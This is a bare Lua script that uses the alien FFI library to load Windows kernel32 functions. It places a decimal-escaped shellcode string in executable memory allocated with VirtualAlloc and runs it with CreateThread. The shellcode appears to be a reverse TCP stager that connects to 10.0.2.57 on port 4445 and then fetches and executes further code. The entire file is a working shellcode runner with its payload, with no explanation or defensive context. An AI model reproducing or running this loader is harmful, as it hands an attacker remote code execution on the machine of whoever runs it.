shellcode="\252\232\137\000\000\000\096\137\229\049\210\100\139\082\048\139\082\012\139\082\020\139\114\040\015\183\074\038\049\255\049\192\172\060\097\124\002\044\032\193\207\013\001\199\226\240\082\087\139\082\016\139\066\060\001\208\139\064\120\133\192\116\074\001\208\080\139\072\024\139\088\032\001\211\227\060\073\139\052\139\001\214\049\255\049\192\172\193\207\013\001\199\056\224\117\244\003\125\248\059\125\036\117\226\088\139\088\036\001\211\102\139\012\075\139\088\028\001\211\139\004\139\001\208\137\068\036\036\091\091\097\089\090\081\255\224\088\095\090\139\018\235\134\093\104\051\050\000\000\104\119\115\050\095\084\104\076\119\038\007\255\213\184\144\001\000\000\041\196\084\080\104\041\128\107\000\255\213\080\080\080\080\064\080\064\080\104\234\015\223\224\255\213\151\104\010\000\002\057\104\002\000\017\093\137\230\106\016\086\087\104\153\165\116\097\255\213\133\192\116\018\049\192\102\139\070\002\134\224\102\064\134\224\102\137\070\002\235\223\106\000\106\004\086\087\104\002\217\200\095\255\213\139\054\106\064\104\000\016\000\000\086\106\000\104\088\164\083\229\255\213\147\083\106\000\086\083\087\104\002\217\200\095\255\213\001\195\041\198\133\246\117\236\195"
core = require "alien.core"
kernel32 = core.load("Kernel32")
len = string.len(shellcode)

va = kernel32.VirtualAlloc
va:types{ ret = 'int', abi = 'stdcall', 'int', 'int', 'int', 'int' }
ptr = va(0, len, 0x3000, 0x40)

vl = kernel32.VirtualLock
vl:types{ ret = 'int', abi = 'stdcall', 'int', 'int' }
vl(ptr, len)

rmm = kernel32.RtlMoveMemory
rmm:types{ ret = 'int', abi = 'stdcall', 'int', 'string', 'int'}
rmm(ptr, shellcode, len)

ct = kernel32.CreateThread
ct:types{ ret = 'int', abi = 'stdcall', 'int', 'int', 'int', 'int', 'int', 'ref int'}
ht = ct(0, 0, ptr, 0, 0, 0)

wfso = kernel32.WaitForSingleObject
wfso:types{ ret = 'int', abi = 'stdcall', 'int', 'int'}
wfso(ht, -1)
        